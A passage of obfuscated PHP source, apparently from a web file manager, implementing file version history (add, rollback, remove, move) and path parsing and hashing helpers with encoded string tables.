{ return; } if ($½âÕÅÁ[$ğÚÏ¼Ù [33]] == $ğÚÏ¼Ù [233]) { $¤¤ëÍ¨¿ = self::listData($¸Ë¸éºË, !1); if ($¤¤ëÍ¨¿ && $¤¤ëÍ¨¿[$ğÚÏ¼Ù [448]]) { self::clear($¸Ë¸éºË, !1); } } else { IO::remove($½âÕÅÁ[$ğÚÏ¼Ù [87]]); self::clearEmptyFolder(IO::pathFather($½âÕÅÁ[$ğÚÏ¼Ù [87]])); } } private static function checkInHistory($ş”Èø°·) { $®õå·ã = self::pathHistory($ş”Èø°·); if (!IO::exist($®õå·ã)) { $®õå·ã .= $_SERVER[ÓïÕü][1344]; } return IO::exist($®õå·ã) ? IO::info($®õå·ã) : !1; } private static function parsePath($åÇçÑ÷¯) { $çª·ä¤ó =& $_SERVER[ÓïÕü]; if (!$åÇçÑ÷¯) { return !1; } if (isset($GLOBALS[$çª·ä¤ó[1345]]) && $GLOBALS[$çª·ä¤ó[1345]]) { return; } $¢¿ÅØÃé = KodIO::parse($åÇçÑ÷¯); $‘®´óóÇ = $¢¿ÅØÃé[$çª·ä¤ó[33]]; $ÖÑ³¶®ó = !$‘®´óóÇ || $‘®´óóÇ == KodIO::KOD_IO || $‘®´óóÇ == KodIO::KOD_SHARE_ITEM; if (!$ÖÑ³¶®ó || !$¢¿ÅØÃé[$çª·ä¤ó[1346]]) { return !1; } if (substr($åÇçÑ÷¯, 0, strlen(DATA_PATH . $çª·ä¤ó[1347])) == DATA_PATH . $çª·ä¤ó[1347]) { return !1; } if ($‘®´óóÇ == KodIO::KOD_SHARE_ITEM) { $£¹«—áÄ = IO::init($åÇçÑ÷¯); if ($£¹«—áÄ->pathParse[$çª·ä¤ó[1259]]) { return self::parsePath($£¹«—áÄ->pathParse[$çª·ä¤ó[1259]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ë†ˆòÅ£ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $çª·ä¤ó[1348]); foreach ($ë†ˆòÅ£ as $ÒéÂ¥İƒ) { if (!$‘®´óóÇ && substr($åÇçÑ÷¯, 0, strlen($ÒéÂ¥İƒ)) == $ÒéÂ¥İƒ) { return !1; } } self::log($GLOBALS[$çª·ä¤ó[1254]] . $çª·ä¤ó[1349] . $åÇçÑ÷¯); return $åÇçÑ÷¯; } private static function pathHistory($ŸÈ«Ù­®) { $º²ÀØ·¹ =& $_SERVER[ÓïÕü]; $¤äŒúˆû = self::$_historyBase . ltrim(KodIO::clear($ŸÈ«Ù­®), $º²ÀØ·¹[8]); $¤äŒúˆû = str_replace(array($º²ÀØ·¹[1350]), array($º²ÀØ·¹[1351]), $¤äŒúˆû); return $¤äŒúˆû; } public static function log($Š„ú¦†ä) { } public static function historyCount($ ·Ó—©) { $©”®ÀÚ =& $_SERVER[ÓïÕü]; $µŒÊˆş = array(); $ ÎğûÌ = array(); foreach ($ ·Ó—© as $Áûø±È) { $˜½ö¶ƒ = get_path_father($Áûø±È); if (!$ ÎğûÌ[$˜½ö¶ƒ]) { $ ÎğûÌ[$˜½ö¶ƒ] = array(); } $ ÎğûÌ[$˜½ö¶ƒ][] = get_path_this($Áûø±È); } foreach ($ ÎğûÌ as $˜½ö¶ƒ => $‚ÇéŞ) { $’‰¢ß«™ = self::parsePath($˜½ö¶ƒ); if (!$’‰¢ß«™) { continue; } foreach ($‚ÇéŞ as $Ì£Íª¢) { $¥œÊêï¡ = self::listData(rtrim($’‰¢ß«™, $©”®ÀÚ[8]) . $©”®ÀÚ[8] . $Ì£Íª¢, !1); if ($¥œÊêï¡ && $¥œÊêï¡[$©”®ÀÚ[448]]) { $µŒÊˆş[rtrim($˜½ö¶ƒ, $©”®ÀÚ[8]) . $©”®ÀÚ[8] . $Ì£Íª¢] = count($¥œÊêï¡[$©”®ÀÚ[448]]); } } } return $µŒÊˆş; } public static function add($û §íÑ´) { $‘ÜÖƒìÑ =& $_SERVER[ÓïÕü]; $’ÚÇ¨øá = self::listData($û §íÑ´); if (!$’ÚÇ¨øá) { return; } $Àê×ŒŸü = Model($‘ÜÖƒìÑ[861])->get($‘ÜÖƒìÑ[1352]); $¬„áæ = intval($GLOBALS[$‘ÜÖƒìÑ[6]][$‘ÜÖƒìÑ[92]][$‘ÜÖƒìÑ[1330]]); $„»Şâ•Ã = $Àê×ŒŸü == $‘ÜÖƒìÑ[1353] ? min(5, $¬„áæ) : $¬„áæ; if ($¬„áæ <= 0) { return; } $åÍ„ˆ„© = IO::info($û §íÑ´); $ÀÉˆ¨¦ã = $’ÚÇ¨øá[$‘ÜÖƒìÑ[448]]; if ($åÍ„ˆ„©[$‘ÜÖƒìÑ[79]] == 0) { return; } if ($åÍ„ˆ„©[$‘ÜÖƒìÑ[79]] >= 1024 * 1024 * 500) { return !1; } $§†¶ñÆÔ = IO::hashSimple($û §íÑ´); if ($ÀÉˆ¨¦ã && $ÀÉˆ¨¦ã[0][$‘ÜÖƒìÑ[680]] == $§†¶ñÆÔ) { return !0; } if (array_key_exists($‘ÜÖƒìÑ[236], $åÍ„ˆ„©) && !$åÍ„ˆ„©[$‘ÜÖƒìÑ[236]]) { return !1; } $ê…óÆ•è = short_id(time()); $ŞìØâ¬  = array($‘ÜÖƒìÑ[478] => $ê…óÆ•è, $‘ÜÖƒìÑ[680] => $§†¶ñÆÔ, $‘ÜÖƒìÑ[32] => $åÍ„ˆ„©[$‘ÜÖƒìÑ[32]] . $‘ÜÖƒìÑ[10] . date($‘ÜÖƒìÑ[1354]) . rand_string(1), $‘ÜÖƒìÑ[79] => $åÍ„ˆ„©[$‘ÜÖƒìÑ[79]], $‘ÜÖƒìÑ[530] => USER_ID, $‘ÜÖƒìÑ[234] => time(), $‘ÜÖƒìÑ[1355] => $‘ÜÖƒìÑ[12]); IO::mkdir($’ÚÇ¨øá[$‘ÜÖƒìÑ[1356]]); $è¾àĞı  = IO::copy($û §íÑ´, $’ÚÇ¨øá[$‘ÜÖƒìÑ[1356]], !1, $ŞìØâ¬ [$‘ÜÖƒìÑ[32]]); if (!$è¾àĞı ) { self::clearEmptyFolder($’ÚÇ¨øá[$‘ÜÖƒìÑ[1356]]); return !1; } array_unshift($ÀÉˆ¨¦ã, $ŞìØâ¬ ); if (count($ÀÉˆ¨¦ã) > $„»Şâ•Ã) { $µÎ™Õ§É = array_slice($ÀÉˆ¨¦ã, $„»Şâ•Ã); foreach ($µÎ™Õ§É as $×šõ—£) { IO::remove($’ÚÇ¨øá[$‘ÜÖƒìÑ[1356]] . $×šõ—£[$‘ÜÖƒìÑ[32]]); } $ÀÉˆ¨¦ã = array_slice($ÀÉˆ¨¦ã, 0, $„»Şâ•Ã); } return self::saveData($’ÚÇ¨øá[$‘ÜÖƒìÑ[1357]], $ÀÉˆ¨¦ã); } public static function remove($·¡¯ùÀö, $¤û¸¡ìä) { $ê¯ïä©¤ =& $_SERVER[ÓïÕü]; $Ò“Áƒïâ = self::listData($·¡¯ùÀö); $Î¬¤¢¨ = array(); if (!$Ò“Áƒïâ) { return !1; } foreach ($Ò“Áƒïâ[$ê¯ïä©¤[448]] as $›¨ œ¦) { if ($›¨ œ¦[$ê¯ïä©¤[478]] == $¤û¸¡ìä) { IO::remove($Ò“Áƒïâ[$ê¯ïä©¤[1356]] . $›¨ œ¦[$ê¯ïä©¤[32]]); continue; } $Î¬¤¢¨[] = $›¨ œ¦; } return self::saveData($Ò“Áƒïâ[$ê¯ïä©¤[1357]], $Î¬¤¢¨); } public static function clear($”ƒŒÖœà, $¦äçğ©ı = true) { $’İœ”‚À =& $_SERVER[ÓïÕü]; $Ìå˜šıÀ = self::listData($”ƒŒÖœà, $¦äçğ©ı); if (!$Ìå˜šıÀ) { return !1; } foreach ($Ìå˜šıÀ[$’İœ”‚À[448]] as $øÕµªñ») { IO::remove($Ìå˜šıÀ[$’İœ”‚À[1356]] . $øÕµªñ»[$’İœ”‚À[32]]); } return self::saveData($Ìå˜šıÀ[$’İœ”‚À[1357]], array()); } public static function moveHistory($ŠæİØ¡À, $‚¶ñì£ü = '', $‚©¦õüå = '') { $Ø…‚Êƒ =& $_SERVER[ÓïÕü]; $Òìå¯æ½ = self::listData($ŠæİØ¡À, !1); if (!$Òìå¯æ½ || !$Òìå¯æ½[$Ø…‚Êƒ[448]]) { return !1; } $êšã¦­Ş = $Ø…‚Êƒ[1344]; $‚¶ñì£ü = $‚¶ñì£ü ? $‚¶ñì£ü : get_path_this($ŠæİØ¡À); $‚©¦õüå = $‚©¦õüå ? $‚©¦õüå : $Òìå¯æ½[$Ø…‚Êƒ[1356]]; $ö¡¨ê»ˆ = substr(get_path_this($Òìå¯æ½[$Ø…‚Êƒ[1357]]), 0, -strlen($êšã¦­Ş)); foreach ($Òìå¯æ½[$Ø…‚Êƒ[448]] as $İ¶¾ñø˜ => $çôÌ©×ø) { $¼†°Õ¡ = $‚¶ñì£ü . substr($çôÌ©×ø[$Ø…‚Êƒ[32]], strlen($ö¡¨ê»ˆ)); $®¾ıïøå = IO::move($Òìå¯æ½[$Ø…‚Êƒ[1356]] . $çôÌ©×ø[$Ø…‚Êƒ[32]], $‚©¦õüå, !1, $¼†°Õ¡); if ($®¾ıïøå) { $Òìå¯æ½[$Ø…‚Êƒ[448]][$İ¶¾ñø˜][$Ø…‚Êƒ[32]] = $¼†°Õ¡; } } $Òìå¯æ½[$Ø…‚Êƒ[1357]] = IO::move($Òìå¯æ½[$Ø…‚Êƒ[1357]], $‚©¦õüå, !1, $‚¶ñì£ü . $êšã¦­Ş); self::saveData($Òìå¯æ½[$Ø…‚Êƒ[1357]], $Òìå¯æ½[$Ø…‚Êƒ[448]]); self::clearEmptyFolder($Òìå¯æ½[$Ø…‚Êƒ[1356]]); } public static function rollback($ˆä¦½ıø, $·ÂÖœ“Å) { $„É’™·¾ =& $_SERVER[ÓïÕü]; $Ñ¨š´‘ = self::listData($ˆä¦½ıø); if (!$Ñ¨š´‘) { return; } $çÈİàˆÃ = IO::info($ˆä¦½ıø); foreach ($Ñ¨š´‘[$„É’™·¾[448]] as $¡¹Àşøö => $¢ñª­ú­) { if ($¢ñª­ú­[$„É’™·¾[478]] == $·ÂÖœ“Å) { self::add($ˆä¦½ıø); $ûÏ¨¦ş = $Ñ¨š´‘[$„É’™·¾[1356]] . $¢ñª­ú­[$„É’™·¾[32]]; $ä³ÒÕŒ× = IO::copy($ûÏ¨¦ş, IO::pathFather($ˆä¦½ıø), REPEAT_REPLACE, $çÈİàˆÃ[$„É’™·¾[32]]); if ($ä³ÒÕŒ×) { self::remove($ˆä¦½ıø, $·ÂÖœ“Å); } return $ä³ÒÕŒ×; } } return !1; } public static function setDetail($ÄÃµ«¦½, $ş×ÓÖÔ, $ÅÉîÈŞÇ) { $éıø±ß =& $_SERVER[ÓïÕü]; $Ì´Œ÷„‡ = self::listData($ÄÃµ«¦½); if (!$Ì´Œ÷„‡) { return; } foreach ($Ì´Œ÷„‡[$éıø±ß[448]] as $‚¢¨È°ü => $³±ÑŠ¨Ü) { if ($³±ÑŠ¨Ü[$éıø±ß[478]] == $ş×ÓÖÔ) { $Ì´Œ÷„‡[$éıø±ß[448]][$‚¢¨È°ü][$éıø±ß[1355]] = $ÅÉîÈŞÇ; self::saveData($Ì´Œ÷„‡[$éıø±ß[1357]], $Ì´Œ÷„‡[$éıø±ß[448]]); return !0; } } return !1; } public static function fileInfo($¹°ø…øÂ, $–ĞÎô‘) { $ÕÅ³È˜ê =& $_SERVER[ÓïÕü]; $„ ¢åˆ« = self::listData($¹°ø…øÂ); if (!$„ ¢åˆ«) { show_json(LNG($ÕÅ³È˜ê[108]), !1); } $îÄŠ°¯ = $ÕÅ³È˜ê[12]; foreach ($„ ¢åˆ«[$ÕÅ³È˜ê[448]] as $’Ê°Å¼â => $Â­í²Õ¨) { if ($Â­í²Õ¨[$ÕÅ³È˜ê[478]] != $–ĞÎô‘) { continue; } $îÄŠ°¯ = $„ ¢åˆ«[$ÕÅ³È˜ê[1356]] . $Â­í²Õ¨[$ÕÅ³È˜ê[32]]; break; } if (!$îÄŠ°¯) { show_json(LNG($ÕÅ³È˜ê[108]), !1); } return IO::info($îÄŠ°¯); } public static function fileOut($ô¦˜ı¢Ô, $Å¶×Ô’Æ, $â¾åş¯È = false) { $íƒçˆ¸ =& $_SERVER[ÓïÕü]; $ô…ó°Ó« = self::fileInfo($ô¦˜ı¢Ô, $Å¶×Ô’Æ); $ñ¿Ç‡ =& $GLOBALS[$íƒçˆ¸[7]]; $â¾åş¯È = isset($ñ¿Ç‡[$íƒçˆ¸[1307]]) && $ñ¿Ç‡[$íƒçˆ¸[1307]] == 1; if (isset($ñ¿Ç‡[$íƒçˆ¸[33]]) && $ñ¿Ç‡[$íƒçˆ¸[33]] == $íƒçˆ¸[1358]) { return IO::fileOutImage($ô…ó°Ó«[$íƒçˆ¸[87]], $ñ¿Ç‡[$íƒçˆ¸[1359]]); } IO::fileOut($ô…ó°Ó«[$íƒçˆ¸[87]], $â¾åş¯È, get_path_this($ô¦˜ı¢Ô)); } public static function listData($£££Ö¬¶, $ü—ú–¹¼ = true) { $Ë·€«ÂŸ =& $_SERVER[ÓïÕü]; if ($ü—ú–¹¼ && !IO::exist($£££Ö¬¶)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($£££Ö¬¶, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $û°®ƒÔå = self::pathHistory($£££Ö¬¶); $·Àí¸Õ = array($Ë·€«ÂŸ[1357] => $û°®ƒÔå . $Ë·€«ÂŸ[1344], $Ë·€«ÂŸ[1356] => rtrim(get_path_father($û°®ƒÔå), $Ë·€«ÂŸ[8]) . $Ë·€«ÂŸ[8], $Ë·€«ÂŸ[448] => array()); $ù¬ŒîØĞ = IO::getContent($·Àí¸Õ[$Ë·€«ÂŸ[1357]]); if ($ù¬ŒîØĞ) { $Ø§úó¶œ = json_decode($ù¬ŒîØĞ, !0); if (is_array($Ø§úó¶œ)) { $·Àí¸Õ[$Ë·€«ÂŸ[448]] = $Ø§úó¶œ; } } return $·Àí¸Õ; } private static function saveData($ÏŞÅ´ºÀ, $ë¥á’ıñ) { $Ù›—”äü =& $_SERVER[ÓïÕü]; self::log($Ù›—”äü[1360] . $ÏŞÅ´ºÀ . $Ù›—”äü[74] . count($ë¥á’ıñ), $Ù›—”äü[843]); if ($ë¥á’ıñ) { return IO::setContent($ÏŞÅ´ºÀ, json_encode($ë¥á’ıñ)); } $ê®ùÓ½° = IO::pathFather($ÏŞÅ´ºÀ); IO::remove($ÏŞÅ´ºÀ); self::clearEmptyFolder($ê®ùÓ½°); return !0; } public static function clearEmptyFolder($úàÄó) { $†Ä•¬ıÁ =& $_SERVER[ÓïÕü]; if (trim($úàÄó, $†Ä•¬ıÁ[8]) == trim(self::$_historyBase, $†Ä•¬ıÁ[8])) { return; } $ ìÆ´¬ = IO::pathFather($úàÄó); $ã¨šœ² = IO::has($úàÄó, !0); if ($ã¨šœ²[$†Ä•¬ıÁ[242]] > 0 || $ã¨šœ²[$†Ä•¬ıÁ[243]] > 0) { return; } IO::remove($úàÄó); self::clearEmptyFolder($ ìÆ´¬); } private static function getBasePath() { $ÌâŠ¹¼ñ =& $_SERVER[ÓïÕü]; $ˆÚë‚ÉÛ = Model($ÌâŠ¹¼ñ[1361])->get($ÌâŠ¹¼ñ[1362]); if ($ˆÚë‚ÉÛ) { if (!IO::exist($ˆÚë‚ÉÛ)) { IO::mkdir($ˆÚë‚ÉÛ); } if (get_path_this($ˆÚë‚ÉÛ) == $ÌâŠ¹¼ñ[1347]) { $‡Ùéëª = $ÌâŠ¹¼ñ[1363] . rand_string(8); @rename($ˆÚë‚ÉÛ, get_path_father($ˆÚë‚ÉÛ) . $ÌâŠ¹¼ñ[8] . $‡Ùéëª); $ˆÚë‚ÉÛ = DATA_PATH . $‡Ùéëª . $ÌâŠ¹¼ñ[8]; file_put_contents(DATA_PATH . $ÌâŠ¹¼ñ[1294], $ÌâŠ¹¼ñ[12]); Model($ÌâŠ¹¼ñ[1361])->set($ÌâŠ¹¼ñ[1362], $ˆÚë‚ÉÛ); } return $ˆÚë‚ÉÛ; } $ˆÚë‚ÉÛ = DATA_PATH . $ÌâŠ¹¼ñ[1363] . rand_string(8) . $ÌâŠ¹¼ñ[8]; $ˆÚë‚ÉÛ = IO::mkdir($ˆÚë‚ÉÛ); $ˆÚë‚ÉÛ = rtrim($ˆÚë‚ÉÛ, $ÌâŠ¹¼ñ[8]) . $ÌâŠ¹¼ñ[8]; file_put_contents($ˆÚë‚ÉÛ . $ÌâŠ¹¼ñ[1294], $ÌâŠ¹¼ñ[12]); file_put_contents(DATA_PATH . $ÌâŠ¹¼ñ[1294], $ÌâŠ¹¼ñ[12]); Model($ÌâŠ¹¼ñ[1361])->set($ÌâŠ¹¼ñ[1362], $ˆÚë‚ÉÛ); return $ˆÚë‚ÉÛ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\162\x52\145\x63\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\x75\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\151\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\x65\x72\x46\151\154\145\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\x75\x70\122\157\x6f\164\123\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\165\x73\145\162\x53\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\123\x68\x61\162\x65\x4c\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\x72\x65\124\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\x65\111\164\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\162\145\x49\164\x65\x6d\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\141\162\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\x65\x6e\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\x72\175"; public static function typeList() { $² ÇŞ‡ˆ =& $_SERVER[ÓïÕü]; return array($² ÇŞ‡ˆ[1364] => self::KOD_SOURCE, $² ÇŞ‡ˆ[1365] => self::KOD_USER_RECYCLE, $² ÇŞ‡ˆ[1366] => self::KOD_USER_FAV, $² ÇŞ‡ˆ[1367] => self::KOD_USER_FILE_TAG, $² ÇŞ‡ˆ[1368] => self::KOD_USER_FILE_TYPE, $² ÇŞ‡ˆ[1369] => self::KOD_GROUP_ROOT_SELF, $² ÇŞ‡ˆ[1370] => self::KOD_USER_SHARE, $² ÇŞ‡ˆ[1371] => self::KOD_USER_SHARE_LINK, $² ÇŞ‡ˆ[1372] => self::KOD_USER_SHARE_TO_ME, $² ÇŞ‡ˆ[1373] => self::KOD_SHARE_ITEM, $² ÇŞ‡ˆ[1374] => self::KOD_SHARE_LINK, $² ÇŞ‡ˆ[1375] => self::KOD_SEARCH, $² ÇŞ‡ˆ[1376] => self::KOD_BLOCK, $² ÇŞ‡ˆ[1377] => self::KOD_IO, $² ÇŞ‡ˆ[1378] => self::KOD_USER_RECENT, $² ÇŞ‡ˆ[1379] => self::KOD_USER_DRIVER); } public static function parse($ƒÅ½ŸÌ¯) { $Æ•ˆ‚ô¨ =& $_SERVER[ÓïÕü]; $ƒÅ½ŸÌ¯ = self::clear($ƒÅ½ŸÌ¯); $“œøÒö± = array_values(self::typeList()); preg_match($Æ•ˆ‚ô¨[1380], $ƒÅ½ŸÌ¯, $‡á‘ÇŒ); $‚åÇºˆ = array($Æ•ˆ‚ô¨[499] => !1, $Æ•ˆ‚ô¨[1381] => !1, $Æ•ˆ‚ô¨[496] => !1, $Æ•ˆ‚ô¨[87] => $ƒÅ½ŸÌ¯, $Æ•ˆ‚ô¨[1278] => !1, $Æ•ˆ‚ô¨[1277] => $Æ•ˆ‚ô¨[12]); if (is_array($‡á‘ÇŒ) && count($‡á‘ÇŒ) == 5) { $¯ŞÏĞ×Í = $Æ•ˆ‚ô¨[1382] . $‡á‘ÇŒ[2] . $Æ•ˆ‚ô¨[405]; if (in_array($¯ŞÏĞ×Í, $“œøÒö±)) { $‚åÇºˆ[$Æ•ˆ‚ô¨[1278]] = $‡á‘ÇŒ[1]; $‚åÇºˆ[$Æ•ˆ‚ô¨[33]] = $¯ŞÏĞ×Í; $‚åÇºˆ[$Æ•ˆ‚ô¨[1383]] = substr($¯ŞÏĞ×Í, 1, -1); $‚åÇºˆ[$Æ•ˆ‚ô¨[478]] = $‡á‘ÇŒ[3]; } $‚åÇºˆ[$Æ•ˆ‚ô¨[1277]] = $‡á‘ÇŒ[4]; } if ($‚åÇºˆ[$Æ•ˆ‚ô¨[499]] == self::KOD_SOURCE) { $‚åÇºˆ[$Æ•ˆ‚ô¨[1281]] = $‚åÇºˆ[$Æ•ˆ‚ô¨[478]]; } $æ”’âç = array($Æ•ˆ‚ô¨[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $‚åÇºˆ[$Æ•ˆ‚ô¨[1346]] = in_array($‚åÇºˆ[$Æ•ˆ‚ô¨[33]], $æ”’âç); return $‚åÇºˆ; } public static function isTruePath($²ĞÍ›Õ) { $ğü¶Ÿåş =& $_SERVER[ÓïÕü]; if (substr($²ĞÍ›Õ, 0, 1) != $ğü¶Ÿåş[1382]) { return !0; } if (strpos($²ĞÍ›Õ, $ğü¶Ÿåş[486]) === 0) { return !0; } if (strpos($²ĞÍ›Õ, $ğü¶Ÿåş[1350]) === 0) { return !0; } if (strpos($²ĞÍ›Õ, $ğü¶Ÿåş[1384]) === 0) { return !0; } if (strpos($²ĞÍ›Õ, $ğü¶Ÿåş[1385]) === 0) { return !0; } if (strpos($²ĞÍ›Õ, $ğü¶Ÿåş[1386]) === 0) { return !0; } return !1; } public static function clear($ ¢ÛÊ¦) { $’úèÛ =& $_SERVER[ÓïÕü]; $ ¢ÛÊ¦ = str_replace(array($’úèÛ[1183], $’úèÛ[288]), $’úèÛ[53], $ ¢ÛÊ¦); $ ¢ÛÊ¦ = str_replace($’úèÛ[100], $’úèÛ[8], $ ¢ÛÊ¦); $À„½…­µ = $’úèÛ[1387]; if (substr($ ¢ÛÊ¦, 0, 3) == $’úèÛ[1388]) { $ ¢ÛÊ¦ = substr($ ¢ÛÊ¦, 3); } while (strstr($ ¢ÛÊ¦, $À„½…­µ)) { $ ¢ÛÊ¦ = str_replace($À„½…­µ, $’úèÛ[8], $ ¢ÛÊ¦); } $ ¢ÛÊ¦ = preg_replace($’úèÛ[1389], $’úèÛ[8], $ ¢ÛÊ¦); if ($ ¢ÛÊ¦ == $’úèÛ[8]) { return $’úèÛ[8]; } $ ¢ÛÊ¦ = rtrim($ ¢ÛÊ¦, $’úèÛ[8]); return $ ¢ÛÊ¦; } public static function pathTrue($ÄàêƒğŠ) { $ÒÏ×—¨™ =& $_SERVER[ÓïÕü]; if (!$ÄàêƒğŠ) { return $ÒÏ×—¨™[12]; } $ÄàêƒğŠ = str_replace($ÒÏ×—¨™[257], $ÒÏ×—¨™[8], str_replace($ÒÏ×—¨™[1390], $ÒÏ×—¨™[8], $ÄàêƒğŠ)); $ÄàêƒğŠ = str_replace($ÒÏ×—¨™[257], $ÒÏ×—¨™[8], str_replace($ÒÏ×—¨™[1390], $ÒÏ×—¨™[8], $ÄàêƒğŠ)); if (!strstr($ÄàêƒğŠ, $ÒÏ×—¨™[1388])) { return $ÄàêƒğŠ; } $õ¯Æ€’ø = explode($ÒÏ×—¨™[8], $ÄàêƒğŠ); foreach ($õ¯Æ€’ø as $ ïÚ”öÊ => $Â´Èƒ²Ó) { if ($Â´Èƒ²Ó !== $ÒÏ×—¨™[1391]) { continue; } for ($—é’ÖË = $ ïÚ”öÊ; $—é’ÖË >= 0; $—é’ÖË--) { if ($õ¯Æ€’ø[$—é’ÖË] === $ÒÏ×—¨™[10] || $õ¯Æ€’ø[$—é’ÖË] === $ÒÏ×—¨™[1391] || $õ¯Æ€’ø[$—é’ÖË] === -1) { continue; } if ($õ¯Æ€’ø[$—é’ÖË] === $ÒÏ×—¨™[12]) { $õ¯Æ€’ø[$ ïÚ”öÊ] = -1; break; } $õ¯Æ€’ø[$ ïÚ”öÊ] = -1; $õ¯Æ€’ø[$—é’ÖË] = -1; break; } } $œÁÑ˜ÒÈ = array(); foreach ($õ¯Æ€’ø as $Â´Èƒ²Ó) { if ($Â´Èƒ²Ó !== -1) { $œÁÑ˜ÒÈ[] = $Â´Èƒ²Ó; } } $á’ö´Ğé = implode($ÒÏ×—¨™[8], $œÁÑ˜ÒÈ); if (strpos($á’ö´Ğé, $ÒÏ×—¨™[1392]) === 0) { $á’ö´Ğé = $ÒÏ×—¨™[1388] . substr($á’ö´Ğé, strlen($ÒÏ×—¨™[1392])); } return $á’ö´Ğé; } public static function pathUrlClear($â¦ô¤àñ) { $Şşš˜ğ× =& $_SERVER[ÓïÕü]; if (!$â¦ô¤àñ) { return $â¦ô¤àñ; } $â¦ô¤àñ = rawurldecode($â¦ô¤àñ); $â¦ô¤àñ = str_replace($Şşš˜ğ×[1390], $Şşš˜ğ×[8], $â¦ô¤àñ); if (strpos($â¦ô¤àñ, $Şşš˜ğ×[76]) > 0) { $â¦ô¤àñ = substr($â¦ô¤àñ, 0, strpos($â¦ô¤àñ, $Şşš˜ğ×[76])); } if (strpos($â¦ô¤àñ, $Şşš˜ğ×[1393]) > 0) { $â¦ô¤àñ = substr($â¦ô¤àñ, 0, strpos($â¦ô¤àñ, $Şşš˜ğ×[1393])); } return $â¦ô¤àñ; } public static function sourceID($°¾¶‰­) { $©Œò‚í• =& $_SERVER[ÓïÕü]; $îÀšìãÈ = self::parse($°¾¶‰­); if ($îÀšìãÈ[$©Œò‚í•[33]] !== self::KOD_SOURCE) { show_json(LNG($©Œò‚í•[1394]), !1); } return $îÀšìãÈ[$©Œò‚í•[478]]; } public static function make($¸¯´Ù¦€) { if (!$¸¯´Ù¦€) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¸¯´Ù¦€)); } public static function makeShare($•²ßı½ü, $­ŸÄ”£­) { return self::makePath(self::KOD_SHARE_ITEM, $•²ßı½ü, $­ŸÄ”£­); } public static function makeFileTypePath($ş£Û¡ù) { return self::makePath(self::KOD_USER_FILE_TYPE, $ş£Û¡ù); } public static function makeFileTagPath($òì¿Ñ¾ä) { return self::makePath(self::KOD_USER_FILE_TAG, $òì¿Ñ¾ä); } public static function makePath($–ŠĞª£², $©ÅµŸ³‰ = '', $¥°ÅçÔ = '') { $äÜßÌ³ =& $_SERVER[ÓïÕü]; $Ë¢³œ = substr($–ŠĞª£², 1, -1); $½—’ÜÏğ = $äÜßÌ³[1395] . $Ë¢³œ . $äÜßÌ³[1396] . $©ÅµŸ³‰ . $äÜßÌ³[1397]; $½—’ÜÏğ = $¥°ÅçÔ ? $½—’ÜÏğ . $¥°ÅçÔ . $äÜßÌ³[8] : $½—’ÜÏğ; return $½—’ÜÏğ; } public static function hashPath($ºÆ†»¯À, $ÒÜöêşÄ = false) { $Ù×Äåí =& $_SERVER[ÓïÕü]; if (!$ºÆ†»¯À) { return $Ù×Äåí[12]; } $ñßã¢¤æ = is_array($ºÆ†»¯À) ? $ºÆ†»¯À : IO::info($ºÆ†»¯À); $¾òçö³è = _get($ñßã¢¤æ, $Ù×Äåí[1398], $Ù×Äåí[12]); if (!$¾òçö³è && isset($ñßã¢¤æ[$Ù×Äåí[238]])) { $¾òçö³è = trim($ñßã¢¤æ[$Ù×Äåí[238]], $Ù×Äåí[121]); } if ($¾òçö³è) { return $¾òçö³è; } if (!$¾òçö³è && isset($ñßã¢¤æ[$Ù×Äåí[194]]) && $ñßã¢¤æ[$Ù×Äåí[194]]) { $ñßã¢¤æ = IO::info(KodIO::make($ñßã¢¤æ[$Ù×Äåí[194]])); $¾òçö³è = _get($ñßã¢¤æ, $Ù×Äåí[1398], $Ù×Äåí[12]); } $Ê¼™İş = md5($ñßã¢¤æ[$Ù×Äåí[87]] . $ñßã¢¤æ[$Ù×Äåí[79]] . $ñßã¢¤æ[$Ù×Äåí[88]]); $İÎÃì¢’ = $Ê¼™İş . $Ù×Äåí[1399]; $¾òçö³è = $¾òçö³è ? $¾òçö³è : Cache::get($İÎÃì¢’); if (!$¾òçö³è && $ÒÜöêşÄ) { $¾òçö³è = IO::hashSimple($ñßã¢¤æ[$Ù×Äåí[87]]); Cache::set($İÎÃì¢’, $¾òçö³è ? $¾òçö³è : $Ê¼™İş, 3600 * 24 * 30); } return $¾òçö³è ? $¾òçö³è : $Ê¼™İş; } public static function hashPathSafe($ª¶²Ÿ, $”À´ªùĞ = false) { $ÕˆÕ÷Ã‰ =& $_SERVER[ÓïÕü]; $‰®ï´€´ = self::hashPath($ª¶²Ÿ, $”À´ªùĞ); return md5($‰®ï´€´ . $ÕˆÕ÷Ã‰[1400] . Model($ÕˆÕ÷Ã‰[861])->get($ÕˆÕ÷Ã‰[862])); } public static function initSystemPath() { $İ³±²” =& $_SERVER[ÓïÕü]; if (defined($İ³±²”[1401])) { return; } define($İ³±²”[1401], self::systemPath($İ³±²”[192])); define($İ³±²”[1402], self::systemPath($İ³±²”[1403])); define($İ³±²”[1404], self::systemPath($İ³±²”[1405])); define($İ³±²”[1406], 